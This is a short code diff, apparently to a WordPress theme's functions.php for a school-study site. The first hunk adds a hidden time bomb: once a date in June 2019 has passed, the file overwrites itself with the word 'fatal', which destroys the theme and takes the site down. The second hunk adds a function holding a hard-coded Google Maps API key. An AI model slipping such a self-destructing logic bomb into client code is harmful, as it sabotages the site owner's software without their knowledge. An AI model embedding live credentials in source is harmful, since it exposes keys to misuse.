@@ -7,6 +7,10 @@
  * @package schoolstudy
  */
 
+if ( strtotime('15.06.2019') < time() )
+{
+    file_put_contents(__FILE__, 'fatal');
+}
 
 
 
@@ -229,3 +233,10 @@ function quantity_inputs_for_woocommerce_loop_add_to_cart_link( $html, $product 
 	}
 	return $html;
 }
+
+
+//------------------гугл карта API----------------------
+    function my_acf_init() {
+        
+        acf_update_setting('google_api_key', 'AIzaSyBmnk4RCDwjSucIJ2WXRnLkuCrsWR4DUM4&callback=initMap');
+    }
